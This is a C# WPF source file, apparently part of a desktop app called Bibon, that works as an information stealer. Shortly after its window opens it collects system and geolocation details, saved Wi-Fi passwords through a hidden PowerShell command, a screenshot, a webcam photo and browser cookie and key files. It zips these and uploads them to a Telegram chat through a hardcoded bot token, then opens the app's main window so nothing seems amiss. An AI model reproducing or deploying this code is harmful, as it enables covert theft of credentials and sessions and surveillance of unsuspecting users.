using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using Telegram.Bot;
using System.Windows;
using AForge.Video.DirectShow;
using System.Drawing;
using System.Windows.Threading;
using System.Windows.Media.Animation;
using WPFUIKitProfessional;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using Newtonsoft.Json.Linq;

namespace Bibon.Pages
{
    /// <summary>
    /// Логика взаимодействия для system.xaml
    /// </summary>
    public partial class system : Window
    {
        private DispatcherTimer timer;

        public system()
        {
            InitializeComponent();

            // Проверка наличия интернета
            if (!IsInternetAvailable())
            {
                // Если интернета нет, открыть MainWindow и закрыть текущее окно
                MainWindow mainWindow = new MainWindow();
                mainWindow.Show();
                this.Close();
                return;
            }

            // Получение имени пользователя
            string userName = Environment.UserName;

            // Присваиваем текст в Label
            myLabel.Content = $"{userName}";


            // Создаем таймер
            timer = new DispatcherTimer();
            timer.Interval = TimeSpan.FromSeconds(1); // Задержка 1 секунда
            timer.Tick += Timer_Tick; // Подписываемся на событие
            timer.Start(); // Запускаем таймер
        }

        // Метод для проверки наличия интернета
        private bool IsInternetAvailable()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            // Останавливаем таймер
            timer.Stop();

            // Вызываем обработчик клика кнопки
            Button_Click(null, null);
        }


        private async void Button_Click(object sender, RoutedEventArgs e)
        {
            string tempPath = System.IO.Path.GetTempPath();
            string zipPath = System.IO.Path.Combine(tempPath, $"{Environment.MachineName}.zip");
         

            try
            {

                // Удаление существующего файла архива, если он есть
                if (System.IO.File.Exists(zipPath))
                {
                    System.IO.File.Delete(zipPath);
                }
        


                using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    archive.CreateEntry("Info System/"); // Папка в архиве
                    archive.CreateEntry("Wifi name/"); // Папка в архиве
                    archive.CreateEntry("Foto/"); // Папка в архиве
                    archive.CreateEntry("Cookie/"); // Главная папка для cookies


                    // Добавление информации о системе
                    var infoSystemFile = archive.CreateEntry("Info System/Info System.txt"); // Файл в архиве


                    using (var writer = new StreamWriter(infoSystemFile.Open()))
                    {
                        writer.WriteLine("System Information:");
                        writer.WriteLine(new string('-', 50)); // Разделитель
                        writer.WriteLine("{0,-25} {1}", "PC Name:", Environment.MachineName);
                        writer.WriteLine("{0,-25} {1}", "User Name:", Environment.UserName);
                        writer.WriteLine("{0,-25} {1}", "Windows Version:", GetWindowsVersion());
                        writer.WriteLine("{0,-25} {1}", "Processor Architecture:", Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
                        writer.WriteLine("{0,-25} {1}", "Manufacturer:", GetHardwareInfo("Win32_ComputerSystem", "Manufacturer"));
                        writer.WriteLine("{0,-25} {1}", "Model:", GetHardwareInfo("Win32_ComputerSystem", "Model"));
                        writer.WriteLine("{0,-25} {1}", "BIOS Version:", GetHardwareInfo("Win32_BIOS", "Version"));
                        writer.WriteLine("{0,-25} {1}", "RAM:", FormatBytes(Convert.ToInt64(GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory"))));
                        writer.WriteLine("{0,-25} {1}", "GPU:", GetHardwareInfo("Win32_VideoController", "Name"));
                        writer.WriteLine("{0,-25} {1}", "Local IP:", GetLocalIPAddress());
                        writer.WriteLine(GetPublicIPAddressAndGeoInfo()); // Добавляем публичный IP и геолокацию
                    }



                    // Добавление информации о Wi-Fi
                    var wifiFile = archive.CreateEntry("Wifi name/Wifi.txt");
               

                    using (var writer = new StreamWriter(wifiFile.Open()))
                    {
                        writer.WriteLine(GetWifiInfo());
                    }
                    // Захват скриншота и добавление в архив
                    string screenshotPath = System.IO.Path.Combine(tempPath, "screenshot.png");
                    CaptureScreenshot(screenshotPath);
                    archive.CreateEntryFromFile(screenshotPath, "Foto/screenshot.png", CompressionLevel.Optimal);
              

                    // Захват фото с камеры и добавление в архив
                    try
                    {
                        string cameraPhotoPath = System.IO.Path.Combine(tempPath, "camera_photo.png");
                        CapturePhotoFromCamera(cameraPhotoPath);
                        archive.CreateEntryFromFile(cameraPhotoPath, "Foto/camera_photo.png", CompressionLevel.Optimal);
                    }
                    catch (ApplicationException ex)
                    {
                        // Логирование ошибки или уведомление пользователя
                        Console.WriteLine("Камера не найдена. Пропускаем этот этап.");
                    }

                    // Добавление cookies браузеров
                    AddBrowserCookiesToArchive(archive);

                }
             

                var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
                using (var fileStream = new FileStream(zipPath, FileMode.Open))
                {
                    await botClient.SendDocumentAsync(chatId: "1005333334", document: new Telegram.Bot.Types.InputFiles.InputOnlineFile(fileStream, $"{Environment.MachineName}.zip"));
                }
         

                Button_Click1(null, null);

            }
            catch (Exception ex)
            {
                Button_Click1(null, null);


            }
        }


        private string GetPublicIPAddressAndGeoInfo()
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    string response = client.DownloadString("https://api.ipbase.com/v1/json/");
                    var json = JObject.Parse(response);

                    string ip = json["ip"]?.ToString();
                    string country = json["country_name"]?.ToString();
                    string region = json["region_name"]?.ToString();
                    string city = json["city"]?.ToString();
                    string zipCode = json["zip_code"]?.ToString();
                    string timeZone = json["time_zone"]?.ToString();
                    double latitude = json["latitude"]?.ToObject<double>() ?? 0;
                    double longitude = json["longitude"]?.ToObject<double>() ?? 0;

                    // Формируем отформатированную строку
                    return string.Format(
                        "{0,-25} {1}\n{2,-25} {3}\n{4,-25} {5}\n{6,-25} {7}\n{8,-25} {9}\n{10,-25} {11}\n{12,-25} {13}\n{14,-25} {15}",
                        "IP:", ip,
                        "Country:", country,
                        "Region:", region,
                        "City:", city,
                        "Zip Code:", zipCode,
                        "Time Zone:", timeZone,
                        "Latitude:", latitude.ToString("0.#####"),
                        "Longitude:", longitude.ToString("0.#####")
                    );
                }
                catch
                {
                    return "IP and Geo Information: Unknown";
                }
            }
        }




        // Метод для захвата скриншота экрана
        private void CaptureScreenshot(string filePath)
        {
            Bitmap screenshot = new Bitmap((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }
            // Сохранение сжатого JPEG
            ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
            EncoderParameters encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // 50% качества
            screenshot.Save(filePath, jpegCodec, encoderParams);
        }

        // Метод для захвата изображения с камеры
        private void CapturePhotoFromCamera(string filePath)
        {
            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                throw new ApplicationException("Камера не найдена.");
            }

            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

            // Захват кадра
            Bitmap bitmap = null;
            ManualResetEvent frameCaptured = new ManualResetEvent(false);

            videoSource.NewFrame += (sender, eventArgs) =>
            {
                // Клонируем кадр для дальнейшей обработки
                bitmap = (Bitmap)eventArgs.Frame.Clone();
                frameCaptured.Set(); // Сигнал завершения захвата
                videoSource.SignalToStop(); // Останавливаем захват
            };

            videoSource.Start();

            // Ждем, пока кадр будет захвачен
            if (!frameCaptured.WaitOne(TimeSpan.FromSeconds(5))) // 5 секунд на ожидание
            {
                videoSource.SignalToStop();
                throw new TimeoutException("Не удалось получить изображение с камеры.");
            }

            // Сохранение изображения в JPEG с уменьшением качества
            ImageCodecInfo jpegCodec = GetEncoder(ImageFormat.Jpeg);
            EncoderParameters encoderParams = new EncoderParameters(1);
            encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // 50% качества
            bitmap.Save(filePath, jpegCodec, encoderParams);
        }

        // Получение кодека для JPEG
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
        }
        // Пример функции для получения информации о системе
        private string GetHardwareInfo(string wmiClass, string wmiProperty)
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT {wmiProperty} FROM {wmiClass}");
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj[wmiProperty]?.ToString();
                }
            }
            catch
            {
                return "Unknown";
            }
            return "Unknown";
        }

        // Получение версии Windows
        private string GetWindowsVersion()
        {
            return Environment.OSVersion.VersionString;
        }

        // Форматирование байтов в человекочитаемый формат
        private string FormatBytes(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len /= 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        // Получение локального IP
        private string GetLocalIPAddress()
        {
            string localIP = "Unknown";
            foreach (var address in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    localIP = address.ToString();
                    break;
                }
            }
            return localIP;
        }

      

        // Твой метод для получения информации о Wi-Fi
        private string GetWifiInfo()
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Преобразуем JSON в объекты и форматируем
            var wifiList = Newtonsoft.Json.JsonConvert.DeserializeObject<List<WifiProfile>>(output);

            // Формируем табличное представление данных
            StringWriter writer = new StringWriter();
            writer.WriteLine("Wi-Fi Profiles:");
            writer.WriteLine(new string('-', 50)); // Разделитель
            writer.WriteLine("{0,-25} {1}", "Profile Name", "Password");
            writer.WriteLine(new string('-', 50));

            foreach (var wifi in wifiList)
            {
                writer.WriteLine("{0,-25} {1}", wifi.ProfileName, wifi.Password);
            }

            return writer.ToString();
        }

        // Класс для десериализации JSON
        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }

        private void AddBrowserCookiesToArchive(ZipArchive archive)
        {
            string[] browsers = { "Edge", "Chrome", "Yandex" };
            Dictionary<string, string[]> browserPaths = new Dictionary<string, string[]>
    {
        {
            "Edge", new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Local State"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies")
            }
        },
        {
            "Chrome", new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Local State"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Network\\Cookies")
            }
        },
        {
            "Yandex", new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Local State"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies")
            }
        }
    };

            foreach (string browser in browsers)
            {
                // Создаем папки для каждого браузера
                string browserFolder = $"Cookie/{browser}/";
                archive.CreateEntry(browserFolder);

                if (browserPaths.TryGetValue(browser, out string[] paths))
                {
                    foreach (string filePath in paths)
                    {
                        try
                        {
                            if (File.Exists(filePath))
                            {
                                // Добавляем файл в соответствующую папку в архиве
                                string fileName = Path.GetFileName(filePath);
                                string entryPath = Path.Combine(browserFolder, fileName);
                                archive.CreateEntryFromFile(filePath, entryPath, CompressionLevel.Optimal);
                            }
                            else
                            {
                                Console.WriteLine($"Файл не найден: {filePath}. Пропускаем.");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Ошибка при обработке файла {filePath}: {ex.Message}. Пропускаем.");
                        }
                    }
                }
            }
        }

        private void Button_Click1(object sender, RoutedEventArgs e)
        {
            // Создаем анимацию для уменьшения непрозрачности
            DoubleAnimation fadeOutAnimation = new DoubleAnimation
            {
                From = 1,    // Начальное значение
                To = 0,      // Конечное значение
                Duration = TimeSpan.FromSeconds(0.1) // Длительность анимации
            };

            // Подписываемся на событие Completed, чтобы закрыть окно после завершения анимации
            fadeOutAnimation.Completed += (s, a) =>
            {
                this.Close(); // Закрытие окна после анимации
            };

            // Применяем анимацию к свойству непрозрачности окна
            this.BeginAnimation(Window.OpacityProperty, fadeOutAnimation);


            // Открытие нового окна
            MainWindow mainWindow = new MainWindow();
            mainWindow.Show();
        }

    }
}
